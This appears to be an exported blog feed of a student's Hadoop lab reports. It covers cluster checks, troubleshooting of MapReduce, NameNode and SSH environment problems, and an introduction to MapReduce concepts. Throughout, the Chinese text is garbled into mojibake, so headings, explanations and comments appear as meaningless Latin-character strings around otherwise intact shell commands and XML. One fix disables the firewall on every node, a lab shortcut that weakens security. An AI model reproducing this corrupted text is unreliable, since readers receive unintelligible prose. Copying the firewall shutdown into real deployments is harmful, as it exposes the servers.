<h2 id="ä¸‰ã€å®éªŒç»“æœ"><a href="#ä¸‰ã€å®éªŒç»“æœ" class="headerlink" title="ä¸‰ã€å®éªŒç»“æœ"></a>ä¸‰ã€å®éªŒç»“æœ</h2><h3 id="ä½¿ç”¨jpsallæŸ¥çœ‹å„ä¸ªèŠ‚ç‚¹çš„çŠ¶æ€"><a href="#ä½¿ç”¨jpsallæŸ¥çœ‹å„ä¸ªèŠ‚ç‚¹çš„çŠ¶æ€" class="headerlink" title="ä½¿ç”¨jpsallæŸ¥çœ‹å„ä¸ªèŠ‚ç‚¹çš„çŠ¶æ€"></a>ä½¿ç”¨jpsallæŸ¥çœ‹å„ä¸ªèŠ‚ç‚¹çš„çŠ¶æ€</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220053357.png" alt="image-20210628134220753"></p>
<p>ä¸é›†ç¾¤è§„åˆ’ç»“æœä¸€è‡´</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220059915.png" alt="image-20210628012056622"></p>
<h3 id="é›†ç¾¤æ—¶é—´åŒæ­¥æ­£å¸¸"><a href="#é›†ç¾¤æ—¶é—´åŒæ­¥æ­£å¸¸" class="headerlink" title="é›†ç¾¤æ—¶é—´åŒæ­¥æ­£å¸¸"></a>é›†ç¾¤æ—¶é—´åŒæ­¥æ­£å¸¸</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102726.png" alt="image-20210628134736319"></p>
<h3 id="NameNode-HTTP-UIæŸ¥çœ‹DataNodeæƒ…å†µ"><a href="#NameNode-HTTP-UIæŸ¥çœ‹DataNodeæƒ…å†µ" class="headerlink" title="NameNode HTTP UIæŸ¥çœ‹DataNodeæƒ…å†µ"></a>NameNode HTTP UIæŸ¥çœ‹DataNodeæƒ…å†µ</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220100464.png" alt="1"></p>
<h3 id="MapReduceæŸ¥çœ‹æ‰§è¡Œä»»åŠ¡ï¼ŒActive-Nodesä¸º3"><a href="#MapReduceæŸ¥çœ‹æ‰§è¡Œä»»åŠ¡ï¼ŒActive-Nodesä¸º3" class="headerlink" title="MapReduceæŸ¥çœ‹æ‰§è¡Œä»»åŠ¡ï¼ŒActive Nodesä¸º3"></a>MapReduceæŸ¥çœ‹æ‰§è¡Œä»»åŠ¡ï¼ŒActive Nodesä¸º3</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220101234.png" alt="2"></p>
<h3 id="å†å²æœåŠ¡å™¨æŸ¥çœ‹æ‰§è¡Œè¿‡çš„ä»»åŠ¡"><a href="#å†å²æœåŠ¡å™¨æŸ¥çœ‹æ‰§è¡Œè¿‡çš„ä»»åŠ¡" class="headerlink" title="å†å²æœåŠ¡å™¨æŸ¥çœ‹æ‰§è¡Œè¿‡çš„ä»»åŠ¡"></a>å†å²æœåŠ¡å™¨æŸ¥çœ‹æ‰§è¡Œè¿‡çš„ä»»åŠ¡</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220101747.png" alt="3"></p>
<h2 id="å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•"><a href="#å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•" class="headerlink" title="å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•"></a>å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•</h2><p>æ­¤éƒ¨åˆ†ä¸ºå®éªŒæŠ¥å‘Šå…³é”®éƒ¨åˆ†ï¼Œè¯¦å°½å™è¿°å®éªŒè¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ³•</p>
<h3 id="Error-Could-not-find-or-load-main-class-org-apache-hadoop-mapreduce-v2-app-MRAppMaster"><a href="#Error-Could-not-find-or-load-main-class-org-apache-hadoop-mapreduce-v2-app-MRAppMaster" class="headerlink" title="Error: Could not find or load main class org.apache.hadoop.mapreduce.v2.app.MRAppMaster"></a>Error: Could not find or load main class org.apache.hadoop.mapreduce.v2.app.MRAppMaster</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102727.png" alt="image-20210628140143997"></p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/mapred-site.xml </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨æ–‡ä»¶ä¸­å¢åŠ ä»¥ä¸‹å†…å®¹</span></span><br><span class="line">&lt;/property&gt;</span><br><span class="line">        &lt;property&gt;</span><br><span class="line">                &lt;name&gt;yarn.app.mapreduce.am.env&lt;/name&gt;</span><br><span class="line">                &lt;value&gt;HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property&gt;</span><br><span class="line">                &lt;name&gt;mapreduce.map.env&lt;/name&gt;</span><br><span class="line">                &lt;value&gt;HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property&gt;</span><br><span class="line">                &lt;name&gt;mapreduce.reduce.env&lt;/name&gt;</span><br><span class="line">                &lt;value&gt;HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br></pre></td></tr></table></figure>

<h3 id="NameNode-WebæœåŠ¡å™¨æ— æ³•è®¿é—®"><a href="#NameNode-WebæœåŠ¡å™¨æ— æ³•è®¿é—®" class="headerlink" title="NameNode WebæœåŠ¡å™¨æ— æ³•è®¿é—®"></a>NameNode WebæœåŠ¡å™¨æ— æ³•è®¿é—®</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102835.png" alt="4">è§£å†³æ–¹æ¡ˆï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å…³é—­é˜²ç«å¢™</span></span><br><span class="line">[huang@hadoop102 ~]$ systemctl stop firewalld</span><br><span class="line">[huang@hadoop102 ~]$ systemctl disable firewalld.service</span><br><span class="line"></span><br><span class="line">[huang@hadoop103 ~]$ systemctl stop firewalld</span><br><span class="line">[huang@hadoop103 ~]$ systemctl disable firewalld.service</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ systemctl stop firewalld</span><br><span class="line">[huang@hadoop104 ~]$ systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>



<h3 id="Hadoop104-ä¸ŠDateNodeå’ŒNodeManageræ²¡å¯åŠ¨"><a href="#Hadoop104-ä¸ŠDateNodeå’ŒNodeManageræ²¡å¯åŠ¨" class="headerlink" title="Hadoop104 ä¸ŠDateNodeå’ŒNodeManageræ²¡å¯åŠ¨"></a>Hadoop104 ä¸ŠDateNodeå’ŒNodeManageræ²¡å¯åŠ¨</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102728.png" alt="image-20210628141052256"></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>workersé…ç½®é”™è¯¯ï¼Œé‡æ–°é…ç½®workers</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">è¯¥æ–‡ä»¶ä¸­ä¸å…è®¸å‡ºç°ç©ºæ ¼ï¼Œç»“å°¾ä¹Ÿä¸è¡Œ</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ xsync /opt/module/hadoop-3.1.3/etc/ </span><br></pre></td></tr></table></figure>



<h3 id="ä¿®æ”¹é…ç½®åé‡å¯æœåŠ¡å‘ç°DataNodeå’ŒNameNodeè¿›ç¨‹åªèƒ½é‡å¯ä¸€ä¸ª"><a href="#ä¿®æ”¹é…ç½®åé‡å¯æœåŠ¡å‘ç°DataNodeå’ŒNameNodeè¿›ç¨‹åªèƒ½é‡å¯ä¸€ä¸ª" class="headerlink" title="ä¿®æ”¹é…ç½®åé‡å¯æœåŠ¡å‘ç°DataNodeå’ŒNameNodeè¿›ç¨‹åªèƒ½é‡å¯ä¸€ä¸ª"></a>ä¿®æ”¹é…ç½®åé‡å¯æœåŠ¡å‘ç°DataNodeå’ŒNameNodeè¿›ç¨‹åªèƒ½é‡å¯ä¸€ä¸ª</h3><p>å› ä¸ºNameNodeåœ¨formatåˆå§‹åŒ–åä¼šç”ŸæˆclusterIdï¼ˆé›†ç¾¤IDï¼‰ï¼ŒDateNodeåœ¨å¯åŠ¨åä¼šç”Ÿæˆå’ŒNameNodeä¸€æ ·çš„clusterIdï¼ˆé›†ç¾¤IDï¼‰ï¼Œå†æ¬¡æ ¼å¼åŒ–NameNodeï¼Œç”Ÿæˆæ–°çš„clusteridï¼Œä¸æœªåˆ é™¤DataNodeçš„clusteridä¸ä¸€è‡´ï¼Œé›†ç¾¤æ‰¾ä¸åˆ°å·²å¾€æ•°æ®ã€‚</p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<p>éœ€è¦é‡æ–°æ ¼å¼åŒ– NameNode çš„è¯ï¼Œ<strong>ä¸€å®šè¦å…ˆåœæ­¢æ‰€æœ‰æœºå™¨çš„NameNode å’Œ DataNode è¿›ç¨‹ï¼Œå¹¶ä¸”è¦åˆ é™¤æ‰€æœ‰æœºå™¨çš„ data å’Œ logs ç›®å½•ï¼Œç„¶åå†è¿›è¡Œæ ¼å¼åŒ–</strong>ã€‚</p>
<h3 id="sshæ²¡æœ‰é…ç½®å¥½ï¼Œå¯¼è‡´ä½¿ç”¨myhadoop-shæ—¶éœ€è¦è¾“å…¥å¯†ç "><a href="#sshæ²¡æœ‰é…ç½®å¥½ï¼Œå¯¼è‡´ä½¿ç”¨myhadoop-shæ—¶éœ€è¦è¾“å…¥å¯†ç " class="headerlink" title="sshæ²¡æœ‰é…ç½®å¥½ï¼Œå¯¼è‡´ä½¿ç”¨myhadoop.shæ—¶éœ€è¦è¾“å…¥å¯†ç "></a>sshæ²¡æœ‰é…ç½®å¥½ï¼Œå¯¼è‡´ä½¿ç”¨myhadoop.shæ—¶éœ€è¦è¾“å…¥å¯†ç </h3><p>è§£å†³æ–¹æ³•ï¼šç”¨sshå°†å„ä¸ªæœåŠ¡å™¨éƒ½äº’ç›¸è¿æ¥ä¸€è¾¹ï¼Œå¦‚æœå‡ºç°è¿ä¸ä¸Šï¼Œéœ€è¦é‡æ–°é…ç½®</p>
<h3 id="ERROR-conf-Configuration-error-parsing-conf-yarn-site-yml"><a href="#ERROR-conf-Configuration-error-parsing-conf-yarn-site-yml" class="headerlink" title="ERROR conf.Configuration: error parsing conf yarn-site.yml"></a>ERROR conf.Configuration: error parsing conf yarn-site.yml</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102729.png" alt="image-20210628142738471"></p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<p>yarn-site.yml ä¸­çš„ä¸€ä¸ªé…ç½®é¡¹å¤šè¾“äº†ä¸€ä¸ªç©ºæ ¼ï¼Œåˆ æ‰å³å¯</p>
<h3 id="é€šè¿‡sshè¿æ¥åˆ°å…¶ä»–æœåŠ¡å™¨æ—¶ï¼Œè‡ªå·±é…ç½®çš„ç¯å¢ƒå˜é‡ä¼šå¤±æ•ˆï¼Œæ¯æ¬¡éƒ½å¾—source-x2F-etc-x2F-profile"><a href="#é€šè¿‡sshè¿æ¥åˆ°å…¶ä»–æœåŠ¡å™¨æ—¶ï¼Œè‡ªå·±é…ç½®çš„ç¯å¢ƒå˜é‡ä¼šå¤±æ•ˆï¼Œæ¯æ¬¡éƒ½å¾—source-x2F-etc-x2F-profile" class="headerlink" title="é€šè¿‡sshè¿æ¥åˆ°å…¶ä»–æœåŠ¡å™¨æ—¶ï¼Œè‡ªå·±é…ç½®çš„ç¯å¢ƒå˜é‡ä¼šå¤±æ•ˆï¼Œæ¯æ¬¡éƒ½å¾—source &#x2F;etc&#x2F;profile"></a>é€šè¿‡sshè¿æ¥åˆ°å…¶ä»–æœåŠ¡å™¨æ—¶ï¼Œè‡ªå·±é…ç½®çš„ç¯å¢ƒå˜é‡ä¼šå¤±æ•ˆï¼Œæ¯æ¬¡éƒ½å¾—source &#x2F;etc&#x2F;profile</h3><p>sshè¿æ¥æ—¶ç¯å¢ƒå˜é‡æ— æ•ˆï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102730.png" alt="image-20210628195903368"></p>
<p>åœ¨hadoopå†…æ—¶ç¯å¢ƒå˜é‡æœ‰æ•ˆï¼š</p>
<p>![æˆªå±2021-06-28 ä¸‹åˆ8.06.44 (SA20225201-é»„åæ—º-Lab-1.assets&#x2F;æˆªå±2021-06-28 ä¸‹åˆ8.06.44 (2)-4882079.png)</p>
<p>é…ç½®çš„ç¯å¢ƒå˜é‡çš„æ–¹å¼ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®JDKç¯å¢ƒå˜é‡</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br></pre></td></tr></table></figure>

<p>é—®é¢˜åŸå› ï¼š</p>
<p>SSH ç™»å½•é»˜è®¤ä¸ºéshellç™»å½•æ–¹å¼ï¼Œè€Œéshellç™»å½•æ–¹å¼æ‰§è¡Œçš„æ˜¯bashrcè„šæœ¬åˆå§‹åŒ–ç¯å¢ƒå˜é‡ã€‚<br>è€Œshellç™»å½•æ–¹å¼åˆ™æ˜¯æ‰§è¡Œçš„æ˜¯profileè„šæœ¬åˆå§‹åŒ–ç¯å¢ƒå˜é‡ã€‚</p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<p>æŠŠåœ¨&#x2F;etc&#x2F;profile.d&#x2F;my_env.shä¸­é…ç½®çš„å†…å®¹æ”¾è¿› &#x2F;etc&#x2F;bashrc æ–‡ä»¶ä¸­å³å¯ï¼›</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/bashrc</span><br><span class="line"><span class="meta">#</span><span class="language-bash">JAVA_HOME</span></span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ sudo xsync /etc/bashrc</span><br><span class="line">==================== hadoop102 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line"></span><br><span class="line">sent 45 bytes  received 12 bytes  38.00 bytes/sec</span><br><span class="line">total size is 3,058  speedup is 53.65</span><br><span class="line">==================== hadoop103 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">bashrc</span><br><span class="line"></span><br><span class="line">sent 366 bytes  received 65 bytes  862.00 bytes/sec</span><br><span class="line">total size is 3,058  speedup is 7.10</span><br><span class="line">==================== hadoop104 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">bashrc</span><br><span class="line"></span><br><span class="line">sent 366 bytes  received 65 bytes  862.00 bytes/sec</span><br><span class="line">total size is 3,058  speedup is 7.10</span><br></pre></td></tr></table></figure>

<p>é—®é¢˜è§£å†³ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220102731.png" alt="image-20210628201757923"></p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-3 MapReduce</title>
    <url>/2021/12/22/%E5%A4%A7%E6%95%B0%E6%8D%AE/Lab-3%20MapReduce/</url>
    <content><![CDATA[<h1 id="Lab-3-MapReduceé…ç½®ä¸æ“ä½œ"><a href="#Lab-3-MapReduceé…ç½®ä¸æ“ä½œ" class="headerlink" title="Lab-3 MapReduceé…ç½®ä¸æ“ä½œ"></a>Lab-3 MapReduceé…ç½®ä¸æ“ä½œ</h1><h2 id="ä¸€ã€å®éªŒåŸç†åˆ†æ"><a href="#ä¸€ã€å®éªŒåŸç†åˆ†æ" class="headerlink" title="ä¸€ã€å®éªŒåŸç†åˆ†æ"></a>ä¸€ã€å®éªŒåŸç†åˆ†æ</h2><h3 id="MapReduceæ˜¯ä»€ä¹ˆ"><a href="#MapReduceæ˜¯ä»€ä¹ˆ" class="headerlink" title="MapReduceæ˜¯ä»€ä¹ˆ"></a>MapReduceæ˜¯ä»€ä¹ˆ</h3><p>MapReduce æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼è¿ç®—ç¨‹åºçš„ç¼–ç¨‹æ¡†æ¶ï¼Œæ˜¯ç”¨æˆ·å¼€å‘â€œåŸºäº Hadoop çš„æ•°æ®åˆ†æ</p>
<p>åº”ç”¨â€çš„æ ¸å¿ƒæ¡†æ¶ã€‚</p>
<p>MapReduce æ ¸å¿ƒåŠŸèƒ½æ˜¯å°†ç”¨æˆ·ç¼–å†™çš„ä¸šåŠ¡é€»è¾‘ä»£ç å’Œè‡ªå¸¦é»˜è®¤ç»„ä»¶æ•´åˆæˆä¸€ä¸ªå®Œæ•´çš„</p>
<p>åˆ†å¸ƒå¼è¿ç®—ç¨‹åºï¼Œå¹¶å‘è¿è¡Œåœ¨ä¸€ä¸ª Hadoop é›†ç¾¤ä¸Šã€‚</p>
<h3 id="MapReduceä¼˜ç¼ºç‚¹"><a href="#MapReduceä¼˜ç¼ºç‚¹" class="headerlink" title="MapReduceä¼˜ç¼ºç‚¹"></a>MapReduceä¼˜ç¼ºç‚¹</h3><h4 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><ul>
<li><p><strong>MapReduce æ˜“äºç¼–ç¨‹</strong></p>
<p>å®ƒç®€å•çš„å®ç°ä¸€äº›æ¥å£ï¼Œå°±å¯ä»¥å®Œæˆä¸€ä¸ªåˆ†å¸ƒå¼ç¨‹åºï¼Œè¿™ä¸ªåˆ†å¸ƒå¼ç¨‹åºå¯ä»¥åˆ†å¸ƒåˆ°å¤§é‡</p>
<p>å»‰ä»·çš„ PC æœºå™¨ä¸Šè¿è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ä½ å†™ä¸€ä¸ªåˆ†å¸ƒå¼ç¨‹åºï¼Œè·Ÿå†™ä¸€ä¸ªç®€å•çš„ä¸²è¡Œç¨‹åºæ˜¯ä¸€æ¨¡ä¸€</p>
<p>æ ·çš„ã€‚å°±æ˜¯å› ä¸ºè¿™ä¸ªç‰¹ç‚¹ä½¿å¾— MapReduce ç¼–ç¨‹å˜å¾—éå¸¸æµè¡Œã€‚</p>
</li>
<li><p><strong>è‰¯å¥½çš„æ‰©å±•æ€§</strong></p>
<p>å½“ä½ çš„è®¡ç®—èµ„æºä¸èƒ½å¾—åˆ°æ»¡è¶³çš„æ—¶å€™ï¼Œä½ å¯ä»¥é€šè¿‡ç®€å•çš„å¢åŠ æœºå™¨æ¥æ‰©å±•å®ƒçš„è®¡ç®—èƒ½åŠ›ã€‚</p>
</li>
<li><p><strong>é«˜å®¹é”™æ€§</strong></p>
<p>MapReduce è®¾è®¡çš„åˆè¡·å°±æ˜¯ä½¿ç¨‹åºèƒ½å¤Ÿéƒ¨ç½²åœ¨å»‰ä»·çš„ PC æœºå™¨ä¸Šï¼Œè¿™å°±è¦æ±‚å®ƒå…·æœ‰å¾ˆé«˜</p>
<p>çš„å®¹é”™æ€§ã€‚æ¯”å¦‚å…¶ä¸­ä¸€å°æœºå™¨æŒ‚äº†ï¼Œå®ƒå¯ä»¥æŠŠä¸Šé¢çš„è®¡ç®—ä»»åŠ¡è½¬ç§»åˆ°å¦å¤–ä¸€ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œ</p>
<p>ä¸è‡³äºè¿™ä¸ªä»»åŠ¡è¿è¡Œå¤±è´¥ï¼Œè€Œä¸”è¿™ä¸ªè¿‡ç¨‹ä¸éœ€è¦äººå·¥å‚ä¸ï¼Œè€Œå®Œå…¨æ˜¯ç”± Hadoop å†…éƒ¨å®Œæˆçš„ã€‚</p>
</li>
<li><p><strong>é€‚åˆ PB çº§ä»¥ä¸Šæµ·é‡æ•°æ®çš„ç¦»çº¿å¤„ç†</strong></p>
<p>å¯ä»¥å®ç°ä¸Šåƒå°æœåŠ¡å™¨é›†ç¾¤å¹¶å‘å·¥ä½œï¼Œæä¾›æ•°æ®å¤„ç†èƒ½åŠ›ã€‚</p>
</li>
</ul>
<h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><ul>
<li><p><strong>ä¸æ“…é•¿å®æ—¶è®¡ç®—</strong></p>
<p>MapReduce æ— æ³•åƒ MySQL ä¸€æ ·ï¼Œåœ¨æ¯«ç§’æˆ–è€…ç§’çº§å†…è¿”å›ç»“æœã€‚</p>
</li>
<li><p><strong>ä¸æ“…é•¿æµå¼è®¡ç®—</strong></p>
<p>æµå¼è®¡ç®—çš„è¾“å…¥æ•°æ®æ˜¯åŠ¨æ€çš„ï¼Œè€Œ MapReduce çš„è¾“å…¥æ•°æ®é›†æ˜¯é™æ€çš„ï¼Œä¸èƒ½åŠ¨æ€å˜åŒ–ã€‚</p>
<p>è¿™æ˜¯å› ä¸º MapReduce è‡ªèº«çš„è®¾è®¡ç‰¹ç‚¹å†³å®šäº†æ•°æ®æºå¿…é¡»æ˜¯é™æ€çš„ã€‚</p>
</li>
<li><p><strong>ä¸æ“…é•¿ DAGï¼ˆæœ‰å‘æ— ç¯å›¾ï¼‰è®¡ç®—</strong></p>
<p>å¤šä¸ªåº”ç”¨ç¨‹åºå­˜åœ¨ä¾èµ–å…³ç³»ï¼Œåä¸€ä¸ªåº”ç”¨ç¨‹åºçš„è¾“å…¥ä¸ºå‰ä¸€ä¸ªçš„è¾“å‡ºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ</p>
<p>MapReduce å¹¶ä¸æ˜¯ä¸èƒ½åšï¼Œè€Œæ˜¯ä½¿ç”¨åï¼Œæ¯ä¸ª MapReduce ä½œä¸šçš„è¾“å‡ºç»“æœéƒ½ä¼šå†™å…¥åˆ°ç£ç›˜ï¼Œ</p>
<p>ä¼šé€ æˆå¤§é‡çš„ç£ç›˜ IOï¼Œå¯¼è‡´æ€§èƒ½éå¸¸çš„ä½ä¸‹ã€‚</p>
</li>
</ul>
<h3 id="MapReduceæ ¸å¿ƒæ€æƒ³"><a href="#MapReduceæ ¸å¿ƒæ€æƒ³" class="headerlink" title="MapReduceæ ¸å¿ƒæ€æƒ³"></a>MapReduceæ ¸å¿ƒæ€æƒ³</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220107200.png" alt="image-20210701084254232"></p>
<ul>
<li><p>åˆ†å¸ƒå¼çš„è¿ç®—ç¨‹åºå¾€å¾€éœ€è¦åˆ†æˆè‡³å°‘ 2 ä¸ªé˜¶æ®µã€‚</p>
</li>
<li><p>ç¬¬ä¸€ä¸ªé˜¶æ®µçš„ MapTask å¹¶å‘å®ä¾‹ï¼Œå®Œå…¨å¹¶è¡Œè¿è¡Œï¼Œäº’ä¸ç›¸å¹²ã€‚</p>
</li>
<li><p>ç¬¬äºŒä¸ªé˜¶æ®µçš„ ReduceTask å¹¶å‘å®ä¾‹äº’ä¸ç›¸å¹²ï¼Œä½†æ˜¯ä»–ä»¬çš„æ•°æ®ä¾èµ–äºä¸Šä¸€ä¸ªé˜¶æ®µ</p>
</li>
</ul>
<p>çš„æ‰€æœ‰ MapTask å¹¶å‘å®ä¾‹çš„è¾“å‡ºã€‚</p>
<ul>
<li>MapReduce ç¼–ç¨‹æ¨¡å‹åªèƒ½åŒ…å«ä¸€ä¸ª Map é˜¶æ®µå’Œä¸€ä¸ª Reduce é˜¶æ®µï¼Œå¦‚æœç”¨æˆ·çš„ä¸š</li>
</ul>
<p>åŠ¡é€»è¾‘éå¸¸å¤æ‚ï¼Œé‚£å°±åªèƒ½å¤šä¸ª MapReduce ç¨‹åºï¼Œä¸²è¡Œè¿è¡Œã€‚</p>
<h3 id="MapReduceè¿›ç¨‹"><a href="#MapReduceè¿›ç¨‹" class="headerlink" title="MapReduceè¿›ç¨‹"></a>MapReduceè¿›ç¨‹</h3><p>ä¸€ä¸ªå®Œæ•´çš„ MapReduce ç¨‹åºåœ¨åˆ†å¸ƒå¼è¿è¡Œæ—¶æœ‰ä¸‰ç±»å®ä¾‹è¿›ç¨‹ï¼š</p>
<ul>
<li><strong>MrAppMaster</strong>ï¼šè´Ÿè´£æ•´ä¸ªç¨‹åºçš„è¿‡ç¨‹è°ƒåº¦åŠçŠ¶æ€åè°ƒã€‚</li>
<li><strong>MapTask</strong>ï¼šè´Ÿè´£ Map é˜¶æ®µçš„æ•´ä¸ªæ•°æ®å¤„ç†æµç¨‹ã€‚</li>
<li><strong>ReduceTask</strong>ï¼šè´Ÿè´£ Reduce é˜¶æ®µçš„æ•´ä¸ªæ•°æ®å¤„ç†æµç¨‹ã€‚</li>
</ul>
<h3 id="å¸¸ç”¨æ•°æ®åºåˆ—åŒ–ç±»å‹"><a href="#å¸¸ç”¨æ•°æ®åºåˆ—åŒ–ç±»å‹" class="headerlink" title="å¸¸ç”¨æ•°æ®åºåˆ—åŒ–ç±»å‹"></a>å¸¸ç”¨æ•°æ®åºåˆ—åŒ–ç±»å‹</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110273.png" alt="image-20210701084749392"></p>
<h3 id="MapReduceç¼–ç¨‹è§„èŒƒ"><a href="#MapReduceç¼–ç¨‹è§„èŒƒ" class="headerlink" title="MapReduceç¼–ç¨‹è§„èŒƒ"></a>MapReduceç¼–ç¨‹è§„èŒƒ</h3><p>1ï¼Mapperé˜¶æ®µ</p>
<p>ï¼ˆ1ï¼‰ç”¨æˆ·è‡ªå®šä¹‰çš„Mapperè¦ç»§æ‰¿è‡ªå·±çš„çˆ¶ç±»</p>
<p>ï¼ˆ2ï¼‰Mapperçš„è¾“å…¥æ•°æ®æ˜¯KVå¯¹çš„å½¢å¼ï¼ˆKVçš„ç±»å‹å¯è‡ªå®šä¹‰ï¼‰ </p>
<p>ï¼ˆ3ï¼‰Mapperä¸­çš„ä¸šåŠ¡é€»è¾‘å†™åœ¨map()æ–¹æ³•ä¸­</p>
<p>ï¼ˆ4ï¼‰Mapperçš„è¾“å‡ºæ•°æ®æ˜¯KVå¯¹çš„å½¢å¼ï¼ˆKVçš„ç±»å‹å¯è‡ªå®šä¹‰ï¼‰ </p>
<p>ï¼ˆ5ï¼‰map()æ–¹æ³•ï¼ˆMapTaskè¿›ç¨‹ï¼‰å¯¹æ¯ä¸€ä¸ª&lt;K,V&gt;è°ƒç”¨ä¸€æ¬¡</p>
<p>2ï¼Reduceré˜¶æ®µ</p>
<p>ï¼ˆ1ï¼‰ç”¨æˆ·è‡ªå®šä¹‰çš„Reducerè¦ç»§æ‰¿è‡ªå·±çš„çˆ¶ç±»</p>
<p>ï¼ˆ2ï¼‰Reducerçš„è¾“å…¥æ•°æ®ç±»å‹å¯¹åº”Mapperçš„è¾“å‡ºæ•°æ®ç±»å‹ï¼Œä¹Ÿæ˜¯KV</p>
<p>ï¼ˆ3ï¼‰Reducerçš„ä¸šåŠ¡é€»è¾‘å†™åœ¨reduce()æ–¹æ³•ä¸­</p>
<p>ï¼ˆ4ï¼‰ReduceTaskè¿›ç¨‹å¯¹æ¯ä¸€ç»„ç›¸åŒkçš„&lt;k,v&gt;ç»„è°ƒç”¨ä¸€æ¬¡reduce()æ–¹æ³•</p>
<p>3ï¼Driveré˜¶æ®µ</p>
<p>ç›¸å½“äºYARNé›†ç¾¤çš„å®¢æˆ·ç«¯ï¼Œç”¨äºæäº¤æˆ‘ä»¬æ•´ä¸ªç¨‹åºåˆ°YARNé›†ç¾¤ï¼Œæäº¤çš„æ˜¯</p>
<p>å°è£…äº†MapReduceç¨‹åºç›¸å…³è¿è¡Œå‚æ•°çš„jobå¯¹è±¡</p>
